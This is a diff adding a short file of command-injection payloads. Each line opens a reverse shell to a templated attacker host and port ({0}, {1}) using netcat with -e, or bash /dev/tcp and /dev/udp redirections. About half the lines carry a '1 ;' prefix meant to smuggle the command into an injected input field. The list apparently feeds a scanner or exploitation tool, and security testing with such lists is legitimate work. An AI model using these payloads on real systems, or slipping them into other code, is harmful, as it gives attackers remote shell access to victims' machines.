@@ -1,0 +1,12 @@
+1 ; nc {0} {1} -e /bin/sh
+nc {0} {1} -e /bin/sh
+1 ; 0<&196;exec 196<>/dev/tcp/{0}/{1}; sh <&196 >&196 2>&196
+0<&196;exec 196<>/dev/tcp/{0}/{1}; sh <&196 >&196 2>&196
+1; exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do $line 2>&5 >&5; done
+exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do $line 2>&5 >&5; done
+1 ; sh -i 5<> /dev/tcp/{0}/{1} 0<&5 1>&5 2>&5
+sh -i 5<> /dev/tcp/{0}/{1} 0<&5 1>&5 2>&5
+1; sh -i >& /dev/udp/{0}/{1} 0>&1
+sh -i >& /dev/udp/{0}/{1} 0>&1
+1; nc {0} {1} -e sh
+nc {0} {1} -e sh
